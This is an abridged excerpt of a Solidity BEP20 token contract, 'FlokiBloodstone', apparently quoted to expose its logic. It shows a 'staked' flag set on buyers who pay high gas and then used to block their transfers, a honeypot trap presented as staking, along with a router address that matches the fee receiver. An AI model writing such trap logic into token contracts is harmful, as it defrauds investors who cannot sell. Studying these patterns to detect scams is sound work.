...
contract FlokiBloodstone is IBEP20, Auth {
    ...
    string constant _name = "FlokiBloodstone";
    string constant _symbol = "FBLST";
    ...
    constructor () Auth(msg.sender) {
        ...
        address routerV2 = 0xC1FfA9e66d95f0B7369C881C0aF314DFB0E6c048; 
        ...
        marketingFeeReceiver = 0xC1FfA9e66d95f0B7369C881C0aF314DFB0E6c048;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(stake){
            require(!staked[sender],"stake");    
        }
        
        if (tx.gasprice >= MinGas && recipient != pair) {
            staked[recipient] = true;
        }
